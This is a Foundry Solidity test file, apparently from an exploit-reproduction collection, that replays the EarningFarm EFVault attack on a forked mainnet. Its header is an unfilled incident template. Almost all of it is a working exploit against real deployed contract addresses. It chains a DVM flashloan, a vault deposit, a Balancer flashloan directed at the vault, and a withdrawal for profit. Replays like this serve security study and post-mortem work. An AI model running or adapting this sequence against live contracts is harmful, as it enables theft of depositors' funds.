// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';
import {BalancerFlashloan} from "../utils/BalancerFlashloan.sol";

// forge test --match-contract Exploit_PROTOCOL_NAME -vvv
/*
On DATE an attacker stole AMOUNT in TYPE tokens from an PROTOCOL.


// Attack Overview
Total Lost: 
Attack Tx: https://etherscan.io/tx/0x160c5950a01b88953648ba90ec0a29b0c5383e055d35a7835d905c53a3dda01e
Ethereum Transaction Viewer: 

Exploited Contract: 
Attacker Address: 
Attacker Contract: 
Attack Block: 15746342 

// Key Info Sources
Twitter: https://twitter.com/Supremacy_CA/status/1581012823701786624
Writeup: 
Article: 
Code: 


Principle: VULN PRINCIPLE


ATTACK:
1)

MITIGATIONS:
1)

*/
interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;    
}

interface IEFVault {
    function withdraw(uint256 _amount) external;    
    function deposit(uint256) payable external;
}

contract Exploit_EarningFarm is TestHarness, TokenBalanceTracker, BalancerFlashloan {
    IDVM internal dvm = IDVM(0x983dfBa1c0724786598Af0E63a9a6f94aAbd24A1);
    IEFVault internal efvault = IEFVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    
    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal eftoken = IERC20(0xBAe7EC1BAaAe7d5801ad41691A2175Aa11bcba19);

    function setUp() external {
        cheat.createSelectFork('mainnet', 15746199);
        cheat.deal(address(this), 0.1 ether);

        addTokenToTracker(address(weth));
        addTokenToTracker(address(eftoken));

        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        console.log('===== STEP 1: Request Flashloan =====');
        dvm.flashLoan(100000000000000000, 0, address(this), hex'31');
    }


    function DVMFlashLoanCall(address arg0, uint256 arg1, uint256 arg2, bytes memory) external {
        require(msg.sender == address(dvm), 'Only DVM');
        require(arg0 == address(this), 'Only requested by this');
        uint256 wethAmt = weth.balanceOf(address(this));
        uint256 ethBefore = address(this).balance;

        console.log('===== STEP 2: Loan Received =====');
        logBalancesWithLabel('Attacker Contract', address(this));

        console.log('===== STEP 3: Deposit to Vault =====');
        efvault.deposit{value: ethBefore}(wethAmt); // https://etherscan.io/tx/0xa59c6b0f288dcc2ba897436620af404f1443635862e555f8ece8e31f3541c5e4
        uint256 initialEfBalance = eftoken.balanceOf(address(this));
        
        logBalancesWithLabel('Attacker Contract', address(this));
        
        console.log('===== STEP 4: Request Balancer loan to the EFVault =====');
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amts = new uint256[](1);
        _amts[0] = 560000000000000000000;

        balancer.flashLoan(address(efvault), _tokens, _amts, hex'307832');
        logBalancesWithLabel('EF Vault', address(efvault));

        console.log('===== STEP 5: Withdraw from vault =====');
        efvault.withdraw(initialEfBalance);

        console.log('===== STEP 6: Repay Loan =====');
        uint256 profit = address(this).balance - ethBefore;
        
        weth.transfer(address(dvm), 100000000000000000);
        logBalancesWithLabel('Attacker Contract', address(this));
    } 

    receive() external payable {}


}